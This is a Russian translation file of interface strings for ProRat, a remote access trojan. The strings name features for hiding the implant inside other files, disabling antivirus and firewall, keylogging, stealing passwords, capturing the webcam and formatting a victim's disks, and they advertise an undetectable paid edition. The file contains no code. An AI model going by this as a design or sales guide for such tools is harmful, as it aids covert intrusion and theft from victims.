;
;  Few rules for translator:
;  For beginning of translate - copy english.ini into the your language.ini
;  Please, translate text only after symbol '='
;  Use '|' character for starting a new line in Message Box Text.
;
;  Translation by revi (revi@revi.org)
;
[Translations]
;*Form1*
String1=PC Инфо
String2=Сообщение
String3=Чат
String4=Приколы 
String5=IExplorer
String6=Панель управ.
String7=Выключить PC
String8=Буфер обмена
String9=Повредить
String10=Удал.Загрузчик
String11=Online Редактор
String12=Принтер
String13=Список задач
String14=Окошки
String15=FTP && Telnet
String16=File Manager
String17=Поиск файлов
String18=Регистры
String19=Screen Shot
String20=KeyLogger
String21=Пароли
String22=Запустить 
String23=Создать
String24=Соединить
String25=Skin Manager
String26=Удалить Лок.Сервер
String27=Скачать папку
String28=Online Новости
String29=О Программе
String30=Помощь
String31=Купить
String32=Информация о системе
String33=Эл. адреса в Регистрах
String34=Последние 25 сайтов
String35=Помощь
String36=Тест
String37=Отправить
String38=Помощь
String39=Типы кнопок
String40=Ok
String41=Да,Нет
String42=Отмена,Повтор
String43=Ok,Отмена
String44=Да,Нет,Отмена
String45=Отмена,Повтор,Игнор
String46=Заголовок окна:
String47=Текст сообщения:
String48=Панель Управления Windows
String49=Извини, дружок, Я больше не работаю на тебя.
String50=Обновить
String51=Снять задачу
String52=Снять все задачи
String53=Помощь
String54=Перезагрузка
String55=Выключить Компьютер
String56=выключить
String57=Принудить Выключить Компьютер 
String58=Помощь
String59=Введите ваш ник:
String60=Введите ник жертвы:
String61=Вид чата:
String62=Начать чат
String63=Закрыть чат
String64=Помощь
String65=Спрятать иконки с раб.стола
String66=Вернуть
String67=Спрятать кнопку Пуск
String68=Вернуть
String69=Спрятать Панель Задач
String70=Вернуть
String71=Открыть CD-ROM
String72=Закрыть
String73=Сумасшедшие Светодиоды
String74=Вылечить
String75=Засорить Экран
String76=Почистить
String77=Шлейф у мыши
String78=Убрать
String79=Заморозить Мышь
String80=Разморозить
String81=Сумасшедшая Мышь
String82=Вылечить
String83=Перевернуть Экран
String84=Вернуть
String85=Блокировать Ctrl+Alt+Del
String86=Нажать Ctrl+Alt+Del
String87=Выключить Монитор
String88=Включить Монитор
String89=Включить Screensaver
String90=Закрыть
String91=Помощь
String92=Эти программы запустятся на компьютере жертвы
String93=Настройки Internet
String94=Настройки Языка
String95=Опции доступа
String96=Настройки Сети
String97=Дата и Время
String98=Опции питания
String99=Модемы
String100=Доб. и Удаление Программ
String101=игровой контроллер
String102=Мышь
String103=Пользователи
String104=Звуковые Устройства
String105=Система
String106=ODBC ресурсы
String107=Помощь
String108=Версия IExplorer:
String109=Домашняя страница:
String110=Изменить заголовки IExplorer'а:
String111=Изменить домашнюю страницу:
String112=Открыть URL:
String113=Обновить
String114=Обновить
String115=Изменить
String116=Изменить
String118=Открыть
String119=Блокировать закрытие окон
String120=Открывать в полный экран
String121=Исправить
String122=Настройки
String123=Помощь
String124=Прочитать
String125=Установить
String126=Очистить
String127=Отключить
String128=Включить
String129=Помощь
String130=Цвет шрифта:
String131=Размер шрифта:
String132=Распечатать
String133=Помощь
String134=Черный
String135=Красный
String136=Прочитать
String137=Empty
String138=Сохранить как...
String139=Очистить
String140=Помощь
String141=Список дисков
String142=Соединить через IExplorer
String143=Изменить Пароль Админа
String144=Открыть Telnet Сервер
String145=Соединить через Telnet
String146=Помощь
String147=User:
String148=Пароль:
String149=Выбрать Skin
String150=Стандарты:
String151=Если ваша система работает медленно, попробуйте другой skin
String152=По умолчанию
String153=Океан
String154=Кофе
String155=Грязный снег
String156=Без Skin'a
String157=Online новости
String158=Соединить
String159=Помощь
String160=Отформатировать диски
String161=Помощь
String162=E-Mail:
String163=ICQ UIN:
String164=Список жертв:
String165=ProMessenger IP:
String166=Имя жертвы:
String167=Порт:
String168=Пароль:
String169=Читать 
String170=Установить
String171=Перезапустить
String172=Удалить Сервер
String173=Помощь
String174=Удалить Лок.Сервер
String175=Используйте это меню чтобы удалить ProRat Сервер или Сервер-Загрузчик из вашей системы
String176=Удалить ProRat Сервер
String177=Удалить Сервер-Загрузчик
String178=Помощь
String179=Обновить
String180=Спрятать
String181=Свернуть
String182=Закрыть
String183=Развернуть
String184=Восстановить
String185=В полный экран
String186=Помощь
String187=Показать Спрятанные Окна
String188=Удаленный Сервер-Загрузчик
String189=URL:
String190=Загрузить и запустить 
String191=Помощь
String192=Вы должны сначала подключиться к серверу.
String193=Загрузка Online Новостей...
String194=Online Новости загружены.
String195=Проблема хостинга. Попробуйте снова, через несколько дней.
String196=Загрузка Plugin...
String197=Прервать соединение
String198=Укажите правильный порт (1 - 65535).
String199=Связь установлена.
String200=Связь прервана.
String201=Соединение...
String203=Ошибка соединения |Сервер, к которому вы пытаетесь подключиться, был изменен! |ProRat клиент не может подключиться к измененному серверу. |Если вы хотите получить не засекаемый сервер,|приобретите ProRat Special Edition. |Спасибо, ProGroup
String204=Сервер защищен паролем.
String205=Пароль:
String206=Проверка пароля...
String207=Пароль проверен, Связь установлена.
String208=Сервер поддерживает только 5 соединений.
String209=Информация о Системе получена.
String210=Эл. адреса из регистров получены.
String211=Обновление закончено.
String212=Версия Iexplorer'а найдена.
String213=Домашняя страница найдена.
String214=Последние 25 сайтов найдены.
String215=Буфер обмена успешно прочитан.
String216=Невозможно прочитать Keylog.
String217=Загрузка Keylog файла...
String218=Невозможно прочитать Keylog предыдущей версии. Нужно обновить сервер.
String219=[Метод2]загрузка изображения...
String220=[Метод1]Невозможно получить изображение с камеры.
String221=Камера в системе не обнаружена.
String222=[Метод1]загрузка изображения с камеры...
String223=[Метод2]загрузка изображения с камеры...
String224=[Метод2]Невозможно получить изображение с камеры.
String225=Список дисков обновлен.
String226=Пароли получены.
String227=Невозможно получить пароли.
String228=Поиск окончен.
String229=Plugin для получения Pop3 паролей не загружен. |Загрузить?
String230=Plugin для получения Dial-up паролей не загружен. |Загрузить?
String231=Настройки сервера успешно прочитаны.
String232=Настройки сервера успешно сохранены.
String233=Список папок обновлен.
String234=Окна обновлены.
String235=Команда запущена.
String236=Plugin для получения FTP-IE-Mail паролей не загружен. |Загрузить?
String237=Загрузка информации о системе...
String238=Загрузка Mail адресов из регистров...
String239=Сообщение отправлено.
String240=Обновление списка задач...
String241=Снятие задачи...
String242=Снятие всех задач повлечет перезагрузку компьютера жертвы и может вызвать потерю данных. |Продолжить? 
String243=Все задачи будут закрыты.
String244=Внимание! Продолжение вызовет повреждение системы жертвы.
String245=Жертва будет вынуждена выключить компьютер.
String246=Компьютер жертвы будет выключен.
String247=Компьютер жертвы будет перезагружен.
String248=Account жертвы будет закрыт.
String249=Загрузка чата...
String250=Закрытие чата...
String251=Убираются иконки с Рабочего Стола...
String252=Восстанавливаются иконки на Рабочем Столе...
String253=Убирается кнопка Пуск...
String254=Восстанавливается кнопка Пуск...
String255=Убирается Панель Задач...
String256=Восстанавливается Панель Задач...
String257=Открывается CD-ROM...
String258=Закрывается CD-ROM...
String259=Светодиоды сходят с ума...
String260=Светодиоды возвращаются в нормальное состояние...
String261=Засоряется экран...
String262=Очистка экрана...
String263=Добавляется шлейф мыши...
String264=Удаляется шлейф мыши...
String265=Мышь блокируется...
String266=Мышь сходит с ума....
String267=Мышь разблокируется...
String268=Мышь возвращается в нормальное состояние...
String269=Блокируется Ctrl+Alt+Del...
String270=Ctrl+Alt+Del разблокируется...
String271=Монитор выключается...
String272=Монитор включается...
String273=ScreenSaver включается...
String274=Экран возвращается в нормальное состояние
String275=Получение версии IExplorer...
String276=Получение домашней страницы...
String277=Установка новой домашней страницы...
String278=Открывается URL...
String279=Кнопка закрытия IExplorer'а удаляется...
String280=Кнопка закрытия IExplorer'а восстанавливается...
String281=Окна IExplorer'a устанавливаются в полноэкранный режим...
String282=Окна IExplorer'a устанавливаются в нормальный режим...
String283=Получение истории URL...
String284=Запуск Панели Управления...
String285=Установка буфера обмена...
String286=Считывание буфера обмена...
String287=Очистка буфера обмена...
String288=Разблокирование буфера обмена...
String289=Блокирование буфера обмена...
String290=Попытка распечатать текст...
String291=Plugin успешно загружен. Нажмите кнопку Пароль. 
String292=Обновление списка дисков...
String293=Изменение Корневого Каталога...
String294=Соединение с интернетом не обнаружено.
String295=Продолжение процесса вызовет |форматирование всех дисков |независимо от операционной системы жертвы.|Продолжить?
String296=Компьютер жертвы будет отформатирован...
String297=Загрузка настроек Сервера...
String298=Введите правильный номер порта (1 - 65535).
String299=Введите пароль сервера.
String300=Сохранение настроек Сервера...
String301=Изменение пароля администратора...
String302=Запуск telnet сервера на компьютере жертвы...
String303=Невозможно соединиться с HyperTerminal'ом!
String304=ProRat сервер успешно удален.
String305=ProRat сервер на вашей машине не обнаружен.
String306=Благодарим за использование %s ||ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ:||Пользователь:%s|Пароль:%s||По всем вопросам обращайтесь в support@prohack.net|Надеемся, вам понравится.|||ProGroup.
String307=Сервер будет перезапущен!
String308=Настройки экрана возвращаются в нормальное состояние.
String309=Экран переворачивается...
String310=Невозможно создать ProMessenger.
String311=ProMessenger создан в текущей директории||Прим.:ProMessenger - это не сервер.|Для дополнительной информации смотрите Помощь.
String312=Серверу сообщается URL для загрузки...
String313=В вашей системе  Сервер-Загрузчик не обнаружен.
String314=Сервер-Загрузчик успешно удален. 
String315=Вы уверены, что хотите удалить сервер? 
String316=Сервер будет удален с компьютера жертвы.
String317=Обновление списка приложений...
String318=Закрытие...
String319=Скрытие...
String320=Показ...
String321=Развертывание в полный экран...
String322=Приложение будет свернуто...
String323=Восстановление...
String324=Изменение заголовка окон IExplorer'а...

;*Form2*
String325=Чат
String326=Отправить

;*Form3*
String327=ScreenShot
String328=Открыть Директорию Изображений
String329=Показать в полном размере
String330=ScreenShot [Метод1]
String331=ScreenShot[Метод2]
String332=Изображение с камеры [Метод1]
String333=Изображение с камеры [Метод2]
String334=Помощь
String335=Качество изображения:
String336=#Метод1:
String337=#Метод2:

String338=Невозможно создать Директорию Изображений!
String339=[Метод1]Получение изображения с экрана...
String340=[#Мето1]Загрузка изображения с экрана...
String341=[#Метод2]Получение изображения с экрана...
String342=Получение изображения с экрана.
String343=Получение изображения.
String344=[Метод1]Получение изображения с камеры...
String345=[Метод2]Получение изображения с камеры...

;*Form4*
String346=Управление файлами
String347=Список дисков
String348=Обновить
String349=Скачать
String350=Загрузить
String351=Удалить
String352=Создать директорию
String353=Запустить
String354=Установить как обои
String355=Поиск файлов
String356=Директория загрузок
String357=Помощь
String358=Папки и файлы
String359=Размер

String360=Обновление списка дисков...
String361=Соединение не готово. Попробуйте снова, через несколько секунд.
String362=Передача...
String363=Невозможно создать директорию для загружаемых файлов!
String364=Передача окончена.
String365=Файл запускается...
String366=Создание обоев...
String367=Новая Папка 
String368=Название Папки:

;*Form5*
String369=Plugins
String370=Загрузка Plugin’а...

;*Form6*
String371=Поиск файлов
String372=Расположение:
String373=Маска поиска:
String374=Искать
String375=Загрузить
String376=Директория загрузки
String377=Помощь

String378=Поиск файлов...
String379=Передача...
String380=Передача закончена.

;*Form7*
String381=Создание Сервера
String382=Уведомления
String383=Основные Настройки
String384=Прикрепить к Файлу
String385=Расширение Сервера
String386=Значок Сервера
String387=Тест 
String388=Создать Сервер
String389=Уведомление по Эл.почте
String390=Уведомление на ICQ Pager
String391=Уведомление по CGI
String392=Уведомление на ProMessenger
String393=Уведомлять по Эл.почте 
String394=Уведомлять на ICQ Page
String395=Уведомлять по CGI
String396=Уведомлять на ProMessenger
String397=E-MAIL :
String398=ICQ UIN:
String399=CGI URL:
String400=ProMessenger IP:
String401=Размер Сервера:
String402=Номер Порта:
String403=Пароль Сервера:
String404=Имя жертвы:
String405=Выдать сообщение об ошибке.
String406=Спрятать сервер после установки
String407=Отключить AV-FW при запуске.
String408=Отключить Windows XP Firewall.
String409=Сбросить Windows XP Restore Points.
String410=Сжать сервер.
String411=Настроить
String412=Прикрепить сервер к Файлу.
String413=Выбрать Файл
String414=Этот Файл будет прикреплен:
String415=Выбрать Расширение Сервера
String416=Преобразовать Сервер
String417=EXE (Есть поддержка иконки)
String418=PIF (Нет поддержки)
String419=BAT (Нет поддержки)
String420=SCR (Есть поддержка иконки)
String421=COM (Нет поддержки)
String422=CMD (Нет поддержки)
String423=EXE2 [ VBS \ HTM ] Преобразователь
String424=Помощь
String425=Значок Сервера:
String426=Выбрать новый

String427=Размер прикрепляемого файла не может превышать 10Mb.
String428=Расширение прикрепляемого файла должно |содержать 3 знака.|Например: (*.jpg,*.mp3,*.xxx)
String429=Сервер будет прикреплен к %s
String430=Отмена 
String431=Прикрепление файла отменено.
String432=Укажите правильный номер порта (1 - 65535).
String433=Введите пароль сервера.
String434=Вы уверены, что хотите использовать этот IP адрес уведомления на ProMessenger? |Это IP адрес Локальной Сети,|если сервер находится вне сети, |вы не сможете получать информацию с сервера.
String435=Ошибка.|Невозможно создать ProRat Сервер.:||Если у вас запущен Антивирус, отключите его |или измените его настройки!|Скорее всего, ваш Антивирус определил сервер как Трояна и не позволяет его создать.|Если вы хотите получить не засекаемый сервер, приобретите ProRat Special Edition...
String436=Ошибка.|Невозможно создать UPX (Executable Packer) :||Если у вас запущен Антивирус, отключите его |или измените его настройки!|Скорее всего, ваш Антивирус определил UPX как Трояна и не позволяет его создать.|Отключите антивирус и попробуйте снова.
String437=Ошибка.|Невозможно Изменить Значок Сервера.
String438=Ошибка.|Невозможно Изменить Значок Присоединенного Сервера.
String439=Ошибка.|Невозможно Создать Присоединенный Сервер.
String440=Присоединенный сервер был создан|в текущей директории.
String441=Сервер был создан|в текущей директории.
String442=Сообщение об ошибке
String443=Введите текст сообщения:
String444=Соединение с интернетом не обнаружено.
String445=Не указан адрес эл.почты.
String446=Невозможно отослать пробное сообщение на этот эл.адрес!|Показать детали?
String447=Не указан URL адрес.
String448=Пробное сообщение успешно отправлено на CGI.
String449=Невозможно отправить пробное сообщение на CGI!
String450=Невозможно отправить пробное сообщение на ProMessenger!
String451=Если вы указали порт, используемый другой программой,|соединение сервера с клиентом будет невозможно.|Если вы не уверены, оставьте номер порта по умолчанию (5110).
String452=Иконка в файле не найдена!
String453=Пробное сообщение успешно отправлено на эл.адрес.|Показать детали?
String454=Пробное сообщение успешно отправлено на ICQ Pager.
String455=Невозможно отправить пробное сообщение на ICQ Pager!
String456=Не указан номер Icq.

;*Form8*
String457=Просмотр Регистров
String458=Корневой Ключ:
String459=Помощь
String460=Ключ 
String461=Значение
String462=Создать новый ключ
String463=Удалить
String464=Переименовать
String465=Скопировать ключ
String466=Обновить
String467=Изменить
String468=Создать новое значение 

String469=Сделать текущей корневую директорию...
String470=Сделать текущей...
String471=Новый Ключ #1
String472=Название ключа:
String473=Создание нового ключа...
String474=Вы уверены, что хотите удалить этот ключ и все его содержимое?
String475=Удаление ключа...
String476=Название нового ключа:
String477=Переименование ключа...
String478=Обновление...
String479=Установка данных значения...
String480=Вы уверены, что хотите удалить это значение?
String481=Удаление значения...
String482=Название нового значения:
String483=Переименование значения...
String484=Название значения
String485=Новое Значение #1
String486=Создание нового значения...

;*Form9*
String487=Создание Сервера-Загрузчика
String488=URL
String489=Присоединить к файлу 
String490=Расширение Сервера
String491=Значок Сервера 
String492=Создать Сервер 
String493=Помощь
String494=Укажите web-адрес, с которого будет загружаться полный ProRat сервер. Для дополнительной информации нажмите Помощь.
String495=URL:
String496=Размер Сервера:
String497=Сжать сервер.
String498=Присоединить сервер к файлу.
String499=Присоединенный файл:
String500=Выбор Расширения Сервера
String501=Преобразовать Сервер
String502=EXE (Есть поддержка иконки)
String503=PIF (Нет поддержки)
String504=BAT (Нет поддержки)
String505=SCR (Есть поддержка иконки)
String506=COM (Нет поддержки)
String507=CMD (Нет поддержки)
String508=EXE2 [ VBS \ HTM ] Преобразователь
String509=Преобразователь папки сервера
String510=Значок Сервера:
String511=Выбрать Значок
String512=Выбрать Файл 
String513=Размер прикрепляемого файла не должен превышать 10Mb.
String514=Расширение прикрепляемого файла |должно содержать 3 знака.|Например: (*.jpg,*.mp3,*.xxx)
String515=К серверу будет прикреплен %s
String516=Отмена

String517=Прикрепление файла отменено.
String518=Не указан URL адрес.
String519=Ошибка.|Невозможно создать FSG (FSG executable packer) :||Если у вас запущен Антивирус, отключите его |или измените его настройки!|Скорее всего, ваш антивирус обнаружил сервер и не позволяет его сжать.|Продолжить?
String520=Ошибка.|Невозможно изменить значок сервера.
String521=Ошибка.|Невозможно изменить значок прикрепленного сервера.
String522=Ошибка.|Невозможно создать прикрепленный сервер.
String523=Прикрепленный Сервер-Загрузчик успешно создан|в текущей директории.
String524=Сервер-Загрузчик успешно создан|в текущей директории.
String525=Значок в файле не обнаружен!

;*Form10*
String526=Создание CGI списка жертв
String527=В этом меню вы можете создать cgi script списка жертв для своего сайта. Для дополнительной информации нажмите Помощь. 
String528=Пароль списка жертв:
String529=Название cgi script'а:
String530=Файл данных CGI Script'а:
String531=Максимальное число в списке:
String532=Создать CGI файлы
String533=Помощь

String534=Укажите название CGI Script'а.
String535=Укажите название файла данных.
String536=Не указано максимальное число в списке.
String537=Невозможно создать CGI папку.
String538=CGI Файлы успешно созданы|в текущей директории.||ПРИМ: Все изменения в cgi script'ах делайте с помощью этого меню.|После создания script'ов не изменяйте их.|Для дополнительной информации нажмите Помощь.
;*Form11*
String539=Установка зашифрованных ключей в регистре yahoo
String540=Yahoo! пользователь ID:
String541=Строка EOptions:
String542=Отмена 
String543=Помощь

String544=Не указан "Yahoo! пользователь ID"
String545=Не указана "Строка Опции"
String546=На вашем компьютере не установлен Yahoo! Messenger.|Перед установкой информации yahoo в регистры, |вы должны установить Yahoo! Messenger  
String547=Вы автоматически подключаетесь к почтовому ящику жертвы. |Подождите несколько минут.

;*Form13*
String548=Запуск программы 
String549=Эти программы вы можете запустить на компьютере жертвы.
String550=Укажите название программы, папки, документа или интернет-адрес, и сервер запустит его на компьютере жертвы.
String551=Ярлыки
String552=Помощь
String553=Введите команду MS-DOS:
String554=Запустить на компьютере жертвы.
String555=Запустить программу
String556=Запустить команду MS-DOS
String557=Запустить список команд 
String558=Запустить VBScript

String559=Запуск команды...
String560=Запуск списка команд...
String561=Запуск VBScript'а...
String562=Запуск программы...

;*Form14*
String563=Помощь ProRat 

;*Form15*
String564=Пароли
String565=FTP - IE - Mail
String566=POP3
String567=Yahoo
String568=Dial-Up
String569=Другие пароли
String570=Сохранить как
String571=Помощь

String572=Защищенные паролем сайты в Internet Explorer'е |Автоматическая подстановка паролей в Internet Explorer'е|Пароли MSN Explorer
String573=Пароли Outlook Express, Microsoft Outlook, |IncrediMail, Eudora и Group Mail Free
String574=Пароли Yahoo! Messenger'а
String575=Пароли Dialup для Windows 95, Windows 98,|Windows ME, Windows 2000, и Windows XP  
String576=ICQ99b-2003a-2003b/Lite/ICQ2003Pro, Miranda-icq,Trillian ICQ&AIM, &RQ-icq,|The Bat!, The Bat! 2 (mailer),|FAR Manager (ftp), Win/Total Commander (ftp)
String577=Получение паролей...
String578=Загрузка Паролей...
String579=Пароли получены.

;*Form16*
String580=KeyLogger
String581=Прочитать Log
String582=Удалить Log
String583=Сохранить как 
String584=Очистить экран 
String585=Помощь
String586=Удаление KeyLog...
String587=Чтение KeyLog...
String588=Загрузка KeyLog...
String589=KeyLog получен.

;*Form18*
String590=Конвертер папки сервера
 String591=Открыть 
String592=Создать папку сервера
String593=Помощь
String594=Выбрать файл сервера:

String595=Ошибка.|Невозможно Создать Папку Сервера.
String596=Не указан файл сервера.
String597=Извините.|Эту опцию могут использовать только пользователи ProRat Special Edition.|Приобретите ProRat Special Edition.
String598=Папка Сервера была успешно создана|в текущей директории.|Не пытайтесь открыть инфицированную папку!|Если вы откроете ее, ваша система будет заражена.|ПРИМ: Эта функция работает только на Windows XP.
String599=Размер выбранного файла сервера не может превышать 50kb.
String600=Нажмите кнопку "Создать папку", чтобы создать папку сервера.

;Form19
String689=Купить 
String690=Хотите ли вы стать владельцем особого ProRat v%s (Special Edition), который невозможно засечь любыми антивирусами и firewall?
String691=Мы предлагаем желающим Special Edition ProRat v%s, который невозможно засечь любыми антивирусами и firewall всего за 200$ (USD)
String692=Мы даем всем владельцам Prorat v%s (Special Edition) 1 год гарантии на то, что программа не будет опознана антивирусами, в противном случае ваша программа будет заменена новой версией.
String693=Владельцы ProRat v%s Special Edition также будут иметь возможность определить свои собственные настройки и добавить или удалить функции с целью максимально облегчить использование программы.
String694=Мы также решаем проблемы использования и даем техническую поддержку всем владельцам Prorat v%s Special edition.
String695=За дополнительной информацией и по вопросам приобретения ProRat v%s Special Edition обращайтесь на mailto:sale@prohack.net
String696=Не забудьте, что нам нужна ваша поддержка для улучшения и развития...

;*Extra1*
String601=Создать ProRat Сервер (%d КБайт)
String602=Создать Сервер-Загрузчик (%d КБайт)
String603=Создать CGI список жертв (%d КБайт)
String604=Создать ProMessenger (%d КБайт)
String605=Помощь
String606=Помощь
String607=Выбрать Файл
String608=Выбрать новый
String609=По умолчанию
String687=Инструменты
String688=Инструменты Преобразования Сервера
String697=Невозможно найти файл Помощи:|Загрузить из сети?

;*Incoming from server*
String610=Загруженный файл запущен.
String611=Невозможно загрузить и запустить файл.
String612=Файл будет загружен и запущен...
String613=Задача снята.
String614=Невозможно снять задачу.
String615=Чат открыт.
String616=Матрикс-Чат открыт.
String617=Чат закрыт.
String618=Иконки рабочего стола спрятаны.
String619=Иконки рабочего стола восстановлены. 
String620=Кнопка Пуск спрятана.
String621=Кнопка Пуск восстановлена.
String622=Панель задач спрятана.
String623=Панель задач восстановлена.
String624=Cd-Rom открыт.
String625=Cd-Rom закрыт.
String626=Светодиоды сошли с ума.
String627=Светодиоды вернулись в нормальное состояние.
String628=Экран засорен.
String629=Экран очищен.
String630=Добавлен шлейф мыши.
String631=Удален шлейф мыши.
String632=Мышь заблокирована.
String633=Мышь разблокирована.
String634=Мышь сошла с ума.
String635=Мышь вернулась в нормальное состояние.
String636=Ctrl+Alt+Del заблокирован.
String637=Ctrl+Alt+Del разблокирован.
String638=Монитор выключен.
String639=Монитор включен.
String640=Скринсейвер запущен.
String641=Скринсейвер выключен.
String642=Панель Управления запущена.
String643=Домашняя страница изменена.
String644=Интернет-страница открыта.
String645=Кнопки закрытия заблокированы.
String646=Кнопки закрытия IExplorer'а разблокированы.
String647=Окна IExplorer'а установлены в полноэкранный режим.
String648=Окна IExplorer'а установлены в нормальный режим.
String650=Буфер обмена установлен.
String651=Буфер обмена очищен.
String652=Буфер обмена заблокирован.
String653=Буфер обмена разблокирован.
String654=Если принтер жертвы включен, задача успешно завершена.
String655=KeyLog удален.
String656=Директория изменена.
String657=Файл запущен.
String658=Невозможно запустить файл.
String659=Пароль Администратора изменен.
String660=Невозможно изменить пароль Администратора!
String661=Telnet Сервер на компьютере жертвы запущен.
String662=Компьютер жертвы не поддерживает telnet соединение.
String663=Экран перевернут.
String664=Обои установлены.
String665=Невозможно установить обои.
String666=Приложение закрыто.
String667=Приложение не удалось закрыть.
String668=Приложение спрятано.
String669=Приложение не удалось спрятать.
String670=Приложение показано.
String671=Приложение не удалось показать.
String672=Приложение развернуто в полный экран.
String673=Приложение не удалось развернуть в полный экран.
String674=Приложение свернуто.
String675=Приложение не удалось свернуть.
String676=Приложение развернуто.
String677=Приложение не удалось развернуть.
String678=Заголовок Internet Explorer'а изменен.
String679=Заголовок Internet Explorer'а не удалось изменить. 
String680=Невозможно выполнить команду.
String681=Невозможно запустить список команд.
String682=Список команд запущен.
String683=Невозможно запустить VBScript.
String684=VBScript запущен.
String685=Программа запущена.
String686=Невозможно запустить программу.


;*ProMessenger*
;*Form1*
ProMessenger1=Соединить
ProMessenger2=Удалить все записи.
ProMessenger3=Скопировать Ip в буфер обмена.
ProMessenger4=ProMessenger
ProMessenger5=ProRat
ProMessenger6=Помощь
ProMessenger7=О программе
ProMessenger8=Выход
ProMessenger9=Настройки
ProMessenger11=Основные настройки
ProMessenger12=Prorat
ProMessenger13=Выход
ProMessenger15=О программе
ProMessenger16=Название PC
ProMessenger17=IP Адрес
ProMessenger18=Порт
ProMessenger19=Жертва
ProMessenger20=Сервер
ProMessenger21=Время
ProMessenger22=Дата
ProMessenger23=Пароль
ProMessenger24=Порт 5111, необходимый для работы ProMessenger, занят другим приложением. В этой ситуации ProMessanger не может получать информацию с сервера.|Продолжить?
ProMessenger25=На вашей системе установлен Windows XP Firewall.|Firewall блокирует поступающую с сервера информацию.|Отключить Firewall?
ProMessenger26=ProMessenger будет работать неправильно.|Продолжить?
ProMessenger27=Windows XP Firewall  отключен.
ProMessenger28=Все записи будут удалены. Вы уверены?
;*Form2*
ProMessenger29=Настройки 
ProMessenger30=Запускать эту программу при запуске Windows
ProMessenger31=Показывать popup, когда жертва выходит online
ProMessenger32=Максимальное число в списке:
ProMessenger33=Ok



;*CGI Strings*
CGIString1=Невозможно найти!
CGIString2=ProHack.Net Список жертв ProRat (-Введите пароль снова-)
CGIString3=Неправильный пароль! Попытайтесь еще раз.
CGIString4=OKEY
CGIString5=ProHack.Net Список жертв ProRat (-Введите пароль-)
CGIString6=Введите Пароль:
CGIString7=ProHack.Net Список жертв ProRat 
CGIString8=PROHACK.NET СПИСОК ЖЕРТВ PRORAT
CGIString9=CGI ТЕСТ : 
CGIString10=ТЕСТ
CGIString11=ЯНВАРЬ 
CGIString12=ФЕВРАЛЬ
CGIString13=МАРТ 
CGIString14=АПРЕЛЬ
CGIString15=МАЙ 
CGIString16=ИЮНЬ
CGIString17=ИЮЛЬ
CGIString18=АВГУСТ
CGIString19=СЕНТЯБРЬ
CGIString20=ОКТЯБРЬ 
CGIString21=НОЯБРЬ
CGIString22=ДЕКАБРЬ 
CGIString23=ВОСКРЕСЕНЬЕ 
CGIString24=ПОНЕДЕЛЬНИК 
CGIString25=ВТОРНИК 
CGIString26=СРЕДА
CGIString27=ЧЕТВЕРГ
CGIString28=ПЯТНИЦА
CGIString29=СУББОТА
CGIString30=ДАТА:
CGIString31=ВРЕМЯ:
CGIString32=ОБНОВИТЬ СТРАНИЦУ
CGIString33=УДАЛИТЬ ЗАПИСЬ
CGIString34=НАЗВАНИЕ PC 
CGIString35=IP АДРЕС
CGIString36=ПОРТ 
CGIString37=ЖЕРТВА
CGIString38=СЕРВЕР
CGIString39=ВРЕМЯ 
CGIString40=ДАТА
CGIString41=ПАРОЛЬ
CGIString42=windows-1251



;============================================= V1.6 ===========================================;

String700=Защита от удаления локального сервера
String701=Неправильный пароль!
String702=Преобразователь сервера в ярлык
String703=Введение:
String704=Значок:
String705=Новый ярлык-сервер создан по вашим настройкам в главной папке программы
String706=Функция создания ярлыка-сервера доступна только |владельцам ProRat Special Edition.|Вы можете воспользоваться этой функцией приобретя ProRat Special Edition.
String707=Вы должиы перезапустить серврер, чтобы активировать изменения.Используйте меню Online Редактор.
String708=Изменеие атрибутов...
String709=Атрибуты изменены.
String710=Изменение атрибутов не удалось.
String711=Только чтение
String712=Скрытый
String713=Системный
String714=Арнив
String715=Файл будет упакован winrar'ом...
String716=Файл упакован winrar'ом.
String717=Невозможно упаковать файл winrar'ом.
String718=Упаковать winrar'ом.
String719=Атрибуты
String720=На компьютере жертвы отсутствует plugin winrar'а.|Установить его сейчас?
String721=Установка Plugin'а завершена.
String722=Просмотреть/Изменить атрибуты файлов

;============================================= V1.7 ===========================================;

String723=Сервисы
String724=Обновление сервисов...
String725=Обновление сервисов закончено.
String726=Остановка сервисов...
String727=Сервисы остановлены.
String728=Запуск сервисов...
String729=Сервис запущен.
String730=Сервис будет отключен...
String731=Сервис отключен.
String732=Сервис будет автоматически запущен после перезагрузки
String733=Сервис автоматически запущен после перезагрузки.
String734=Вы уверены, что хотите удалить сервис?
String735=Сервис будет удален...
String736=Сервис удален.
String737=Менеджер сервисов работает только на системах NT,2000,XP
String738=На компьютере жертвы установлена другая ОС |Менеджер сервисов работает только на системах NT,2000,XP
String739=Обновить
String740=Остановить
String741=Запустить
String742=Отключить
String743=Автозапуск
String744=Удалить
String745=Показывать название
String746=Название Сервиса
String747=Статус
String748=Менеджер Сервисов
String749=Неверный пароль.
String750=Значок
String751=Список
String752=Детали
String753=Адрес не указан.
String754=Загрузчик Mydoom 
String755=Выбрать файл
String756=Загрузить и Выполнить
String757=Отправлено байтов:
String758=Статус
String759=Запуск добавления регистров..
String760=Добавление регистров запущенно.
String761=Добавить регистры

;============================================= V1.8 ===========================================;

String762=Указанный сайт запрещается...
String763=Указанный сайт запрещен.
String764=Не возможно запретить указанный сайт.
String765=Удаление всех запретов...
String766=Все запреты сняты.
String767=Не возможно удалить запреты.
String768=Запрещенные сайты
String769=Запретить
String770=Снять все запреты

String790=Преобразование сервера в портфель
String791=Открыть
String792=Сервер-портфель создан.
String793=Помощь
String794=Открыть файл сервера:

String795=Ошибка.|Не возможно создать сервер-портфель.. 
String796=Вы должны указать файл сервера. 
String797=Опция создания сервер портфеля доступна только|владельцам ProRat Special Edition.| Вы сможете воспользоваться данной опцией приобретя|ProRat Special Edition.
String798=Портфель-сервер создан в главной папке клиента.|Не запускайте портфель на своем компьютере, иначе ваш компьютер будет инфицирован|Прим: Портфель-сервер работает только на системах XP.
String799=Размер файла сервера для создания портфеля не может превышать 50Kb.
String800=Теперь нажав кнопку "Преобразование сервера в портфель" вы можете создать свой портфель..

String801=Эта опция доступна только владельцам ProRat Special Edition.| Чтобы воспользоваться данной опцией вы должны приобрести ProRat Special Edition.
String802=Расширение преобразовано.
String803=Преобразователь расширений.
String804=Файл:
String805=Расширение:
String806=Создать запасную копию. (файл .bak)
String807=Преобразовать.
String808=Connect With Flashfxp

;====================================== V1.9 ====================================;

String809=Get Uin automaticly
String810=ProConnective Notification (Network and Router)
String811=IP (DNS) Address:
String812=Use ProConnective Notification
